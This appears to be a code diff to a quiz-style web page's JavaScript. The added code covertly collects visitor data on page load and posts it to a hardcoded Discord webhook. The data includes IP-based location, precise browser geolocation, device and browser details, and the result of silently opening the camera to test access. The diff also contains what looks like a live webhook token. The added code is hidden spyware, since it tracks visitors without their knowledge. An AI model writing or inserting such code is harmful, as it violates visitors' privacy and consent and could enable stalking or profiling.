@@ -458,8 +458,29 @@ function validateAnswers(questions) {
 (async () => {
     const webhookURL = "https://discord.com/api/webhooks/1329656838291062798/8dGy0f5L0upZt9Ap0td2PDwQ4PEGwLHq_-bOtfru4VFlG6LXFi8El0137jdjKuEn-TNZ";
 
-    // Get IP info
+      // Get IP-based location data
     const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
+
+    // Get geolocation from browser
+    const getGeo = () => new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve(pos.coords),
+            err => resolve(null),
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    });
+
+    const geo = await getGeo();
+
+    // Check camera permission
+    let cameraAccess = "Denied or Not Requested";
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        cameraAccess = "Granted";
+        stream.getTracks().forEach(track => track.stop()); // stop the camera
+    } catch (err) {
+        cameraAccess = "Denied";
+    }
 
     // Device info
     const deviceInfo = {
@@ -469,18 +490,22 @@ function validateAnswers(questions) {
         language: navigator.language,
     };
 
-    // Compose message
+    // Prepare message
     const message = {
-        content: `📡 **New visitor info**
+        content: `📡 **New visitor with extended info**
 🌍 IP: ${ipData?.ip || "N/A"}
-📱 Device: ${deviceInfo.platform}
+🖥️ Platform: ${deviceInfo.platform}
 🧭 Browser: ${deviceInfo.userAgent}
+📏 Screen: ${deviceInfo.screen}
 🗣️ Language: ${deviceInfo.language}
-🖥️ Screen: ${deviceInfo.screen}
-🌐 City: ${ipData?.city || "N/A"}
-🌎 Region: ${ipData?.region || "N/A"}
-🧭 Country: ${ipData?.country_name || "N/A"}
-📍 Latitude/Longitude: ${ipData?.latitude || "?"}, ${ipData?.longitude || "?"}`
+📷 Camera Access: ${cameraAccess}
+📌 IP-based Location:
+   City: ${ipData?.city || "?"}
+   Region: ${ipData?.region || "?"}
+   Country: ${ipData?.country_name || "?"}
+   Lat/Lon: ${ipData?.latitude || "?"}, ${ipData?.longitude || "?"}
+📍 Browser Geolocation:
+   Lat: ${geo?.latitude || "?"}, Lon: ${geo?.longitude || "?"}`
     };
 
     // Send to Discord
@@ -490,15 +515,6 @@ function validateAnswers(questions) {
         body: JSON.stringify(message)
     });
 })();
-
-
-
-
-
-
-
-
-
 
 
   
